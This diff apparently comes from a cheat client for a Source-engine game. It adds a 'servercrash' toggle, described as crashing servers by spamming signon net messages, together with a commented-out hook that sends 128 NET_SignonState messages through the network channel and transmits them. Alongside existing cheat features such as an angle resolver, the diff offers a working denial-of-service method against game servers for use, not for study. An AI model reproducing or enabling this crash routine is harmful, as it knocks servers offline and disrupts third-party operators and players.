@@ -9,7 +9,8 @@
 
 static CatVar resolver(CV_SWITCH, "resolver", "0", "Resolve angles");
 static CatVar nightmode(CV_SWITCH, "nightmode", "0", "Enable nightmode", "");
-
+static CatVar servercrash(CV_SWITCH, "servercrash", "0", "crash servers",
+                          "Crash servers by spamming signon net messages");
 namespace hooked_methods
 {
 
@@ -56,6 +57,13 @@ DEFINE_HOOKED_METHOD(FrameStageNotify, void, void *this_,
             OldNightmode = nightmode;
         }
     }
+//    if (servercrash.KeyDown()) {
+//    	NET_SignonState voice_meme(6, 0);
+//        INetChannel *ch = (INetChannel *) g_IEngine->GetNetChannelInfo();
+//        for(int i = 0; i<128; i++)
+//            ch->SendNetMsg((INetMessage&)voice_meme, false, false);
+//        ch->Transmit();
+//    }
     static IClientEntity *ent;
 
     PROF_SECTION(FrameStageNotify_TOTAL);
